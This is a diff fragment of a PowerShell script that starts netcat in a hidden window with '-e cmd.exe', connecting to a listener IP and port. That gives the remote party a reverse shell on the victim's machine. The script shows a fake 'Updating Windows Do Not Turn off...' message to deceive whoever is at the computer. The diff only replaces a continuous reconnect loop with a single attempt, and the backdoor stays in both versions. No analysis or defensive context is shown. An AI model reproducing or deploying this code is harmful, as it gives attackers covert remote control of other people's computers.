@@ -18,12 +18,12 @@ If (-Not (Test-Path $ncPath)) {
 }
 
 # Loop to continuously attempt connection
-while ($true) {
-    Write-Host "Updating Windows Do Not Turn off..."
-    
-    # Attempt to connect using Netcat
-    Start-Process $ncPath -ArgumentList "${listenerIP} ${port} -e cmd.exe" -WindowStyle Hidden
-    
-    # Wait before retrying if connection fails
-    Start-Sleep -Seconds 10
-}
+
+Write-Host "Updating Windows Do Not Turn off..."
+
+# Attempt to connect using Netcat
+Start-Process $ncPath -ArgumentList "${listenerIP} ${port} -e cmd.exe" -WindowStyle Hidden
+
+# Wait before retrying if connection fails
+Start-Sleep -Seconds 10
+
